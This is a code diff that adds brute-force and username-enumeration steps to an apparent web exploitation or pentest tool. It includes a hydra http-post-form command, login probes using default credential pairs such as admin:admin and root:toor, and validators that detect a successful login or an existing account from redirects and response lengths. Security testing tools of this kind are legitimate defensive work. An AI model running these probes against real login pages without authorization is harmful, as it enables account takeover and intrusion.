@@ -4972,6 +4972,127 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "note": "Another common override header"},
         ])
 
+    elif etype == "brute_force_viable":
+        # Brute-force walkthrough — generate a reference hydra cmd and a
+        # small credential-stuffing probe using the most common passwords.
+        # We do NOT actually run a wordlist — responsibility for a real
+        # brute-force stays with the operator.
+        _bf_url = target
+        _bf_path = ei.get("path", "/")
+        _bf_user_field = ei.get("username_field", "username")
+        _bf_pass_field = ei.get("password_field", "password")
+
+        _small_creds = [
+            ("admin", "admin"), ("admin", "password"),
+            ("admin", "admin123"), ("admin", "letmein"),
+            ("root", "root"), ("root", "toor"),
+            ("test", "test"), ("user", "user"),
+        ]
+
+        def _bf_check(r: ExploitResult):
+            # A successful login typically redirects (3xx to a dashboard
+            # path) or sets a session cookie. Flag any 2xx that's not
+            # the login page itself, or any 3xx Location that looks like
+            # a post-login page.
+            sc = r.status_code
+            loc = (r.response_headers.get("Location", "") or
+                   r.response_headers.get("location", ""))
+            if sc in (301, 302, 303, 307, 308) and loc:
+                low_loc = loc.lower()
+                if any(h in low_loc for h in
+                       ("dashboard", "account", "profile", "home",
+                        "welcome", "admin/index")):
+                    r.success = True
+                    r.confidence = 0.9
+                    r.evidence = f"Login succeeded — redirect to {loc[:80]}"
+                    r.false_positive_risk = "low"
+                    return
+            if sc == 200 and "Set-Cookie" in r.response_headers:
+                r.evidence = (f"200 with Set-Cookie — possibly successful; "
+                              f"verify manually")
+                r.confidence = 0.5
+                return
+            r.evidence = f"HTTP {sc}, no post-login redirect"
+            r.confidence = 0.05
+
+        steps = [{"title": "Reference: hydra command",
+                  "note": (f"hydra -L users.txt -P passwords.txt "
+                           f"-s <PORT> -f -m '/'{_bf_path}':"
+                           f"{_bf_user_field}=^USER^&"
+                           f"{_bf_pass_field}=^PASS^:F=<failure_string>' "
+                           f"{urlparse(_bf_url).netloc} http-post-form")}]
+        for u, p in _small_creds:
+            steps.append({
+                "title": f"Probe: {u}:{p}",
+                "request": _post(_bf_url,
+                                 {_bf_user_field: u, _bf_pass_field: p},
+                                 extra_headers=None),
+                "validate": _bf_check,
+                "note": f"Common default credential pair",
+            })
+        # Also override: ensure allow_redirects=False for every step
+        # so we can see the raw response and Location header.
+        for s in steps[1:]:
+            if "request" in s:
+                s["request"]["allow_redirects"] = False
+
+    elif etype == "user_enumeration":
+        # User enumeration: probe a small list of common usernames and
+        # compare response sizes to the bogus-username baseline.
+        _ue_url = target
+        _ue_path = ei.get("path", "/")
+
+        _common_users = [
+            "admin", "administrator", "root", "test", "user", "demo",
+            "guest", "support", "help", "info",
+        ]
+
+        _bogus_user = f"gs_{secrets.token_hex(4)}"
+        _bogus_len_holder: List[int] = []
+
+        def _ue_baseline(r: ExploitResult):
+            _bogus_len_holder.append(len(r.response_body or ""))
+            r.evidence = (f"Baseline (wrong-user) length: "
+                          f"{_bogus_len_holder[-1]}")
+
+        def _ue_probe(r: ExploitResult):
+            if not _bogus_len_holder:
+                r.evidence = "Baseline not captured"
+                return
+            base_len = _bogus_len_holder[0]
+            cur_len = len(r.response_body or "")
+            delta = abs(cur_len - base_len)
+            if base_len > 0 and delta > base_len * 0.2:
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = (f"Length diff: {cur_len} vs baseline "
+                              f"{base_len} (delta={delta}) — username "
+                              f"likely exists")
+                r.false_positive_risk = "low"
+            else:
+                r.evidence = (f"Length similar to baseline "
+                              f"({cur_len} vs {base_len}) — username "
+                              f"probably doesn't exist")
+                r.confidence = 0.2
+
+        steps = [
+            {"title": "Baseline (bogus username)",
+             "request": _post(_ue_url,
+                              {"username": _bogus_user,
+                               "password": secrets.token_hex(4)}),
+             "validate": _ue_baseline,
+             "note": "Capture response length for bogus user"},
+        ]
+        for u in _common_users:
+            steps.append({
+                "title": f"Probe: {u}",
+                "request": _post(_ue_url,
+                                 {"username": u,
+                                  "password": secrets.token_hex(4)}),
+                "validate": _ue_probe,
+                "note": f"If response length differs, '{u}' exists",
+            })
+
     elif etype == "nosql_injection":
         # NoSQL walkthrough — try [$ne], [$gt], [$regex], and the
         # JSON-body shape that MongoDB drivers accept.
